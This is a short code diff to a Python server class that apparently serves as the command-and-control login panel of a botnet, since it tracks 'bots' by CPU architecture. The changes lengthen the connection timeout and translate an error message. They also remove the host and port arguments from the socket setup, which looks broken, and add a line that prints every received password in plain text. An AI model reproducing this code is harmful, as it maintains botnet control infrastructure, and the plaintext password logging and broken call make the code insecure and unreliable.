@@ -67,7 +67,7 @@ class SentinelaServer:
         self.max_username_len = 32
         self.max_password_len = 128
         self.max_data_len = 1024
-        self.connection_timeout = 30
+        self.connection_timeout = 120
         
         self.bots_by_arch = {
             "i386": [], "mips": [], "mips64": [], "x86_64": [],
@@ -141,7 +141,7 @@ class SentinelaServer:
             logging.error("Porta inválida")
             return False
         
-        self.sock = create_server_socket(self.host, self.port)
+        self.sock = create_server_socket()
         server_config = self.config.get("server", {})
         self.sock = setup_ssl_socket(self.sock, server_config)
         
@@ -202,7 +202,7 @@ class SentinelaServer:
             self.send(client, ANSI_CLEAR, False)
             
             if not login(username, password):
-                self.send(client, Fore.RED + 'Credenciais inválidas')
+                self.send(client, Fore.RED + 'Invalid credentials')
                 logging.warning(f"Tentativa de login falhou: {sanitize_log(username)} de {address[0]}")
                 time.sleep(1)
                 client.close()
@@ -242,6 +242,7 @@ class SentinelaServer:
         for _ in range(3):
             self.send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
             data = safe_recv(client, self.max_data_len)
+            print('senha recebida:', data)
             if not data:
                 return None
             password = data.decode('utf-8', errors='ignore').strip()
